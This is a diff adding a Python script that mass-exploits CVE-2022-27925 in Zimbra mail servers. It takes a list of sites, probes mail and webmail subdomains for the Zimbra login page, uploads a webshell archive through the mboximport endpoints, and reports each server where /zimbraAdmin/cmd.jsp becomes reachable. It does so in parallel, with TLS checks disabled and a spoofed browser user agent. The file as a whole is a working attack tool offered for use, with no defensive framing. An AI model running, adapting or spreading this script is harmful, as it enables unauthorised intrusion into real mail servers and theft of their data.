@@ -1,0 +1,112 @@
+#!/usr/bin/env python
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-27925
+import argparse
+import os
+import sys
+from concurrent.futures import ProcessPoolExecutor
+from pathlib import Path
+from typing import Any, Sequence
+
+import requests
+
+requests.packages.urllib3.disable_warnings()
+
+USER_AGENT = (
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    ' AppleWebKit/537.36 (KHTML, like Gecko)'
+    ' Chrome/104.0.0.0 Safari/537.36'
+)
+ZIMBRA_SUBDOMAINS = ['mail', 'email', 'webmail', 'zimbra']
+ZIMBRA_TITLE = '<title>Zimbra Web Client Sign In</title>'
+IMPORT_ENDPOINTS = [
+    '/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd',
+    '/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=',
+]
+
+
+def parse_args(argv: Sequence | None) -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+    )
+    parser.add_argument(
+        '-i',
+        '--input',
+        type=argparse.FileType(),
+        default='-',
+        help='list sites',
+    )
+    parser.add_argument(
+        '-w',
+        '--workers',
+        type=int,
+        default=os.cpu_count(),
+        help='number of workers',
+    )
+    return parser.parse_args(argv)
+
+
+def get_session() -> requests.Session:
+    s = requests.session()
+    s.headers.update({'User-Agent': USER_AGENT})
+    return s
+
+
+def LOG(obj: Any, *args: Any):
+    print(str(obj) % args, file=sys.stderr)
+
+
+def check_exploit(sess: requests.Session, url: str) -> str | None:
+    # https://github.com/MeDx64/CVE-2022-27925/blob/main/CVE-2022-27925.py
+    with (Path(__file__).parent / 'webshell.zip').open('rb') as fp:
+        payload = fp.read()
+    for endpoint in IMPORT_ENDPOINTS:
+        endpoint_url = url + endpoint
+        LOG('check endpoint: %s', endpoint_url)
+        r = sess.post(
+            endpoint_url,
+            data=payload,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            timeout=5.0,
+            verify=False,
+        )
+        LOG('status code: %d', r.status_code)
+        if r.status_code == 401:
+            exploit_url = url + '/zimbraAdmin/cmd.jsp'
+            r1 = sess.get(exploit_url, timeout=5.0, verify=False)
+            if r1.status_code == 200:
+                LOG('exploit url: %s', exploit_url)
+                return r1.url
+
+
+def check_zimbra(base_url: str) -> str | None:
+    sess = get_session()
+    for subdomain in ZIMBRA_SUBDOMAINS:
+        try:
+            url = base_url.replace('://', f'://{subdomain}.')
+            r = sess.get(url, timeout=5.0, verify=False)
+            if ZIMBRA_TITLE in r.text:
+                LOG('zimbra detected: %s', url)
+                return check_exploit(sess, url)
+        except Exception as e:
+            LOG(e)
+
+
+def normalize_url(url: str) -> str:
+    return ['https://', '']['://' in url] + url
+
+
+def main(argv: Sequence | None = None) -> None:
+    args = parse_args(argv)
+    urls = []
+    for line in args.input:
+        if not (url := line.strip()):
+            break
+        urls.append(normalize_url(url))
+    executor = ProcessPoolExecutor(max_workers=args.workers)
+    for result in executor.map(check_zimbra, urls):
+        if result:
+            print(result, flush=True)
+
+
+if __name__ == '__main__':
+    sys.exit(main())
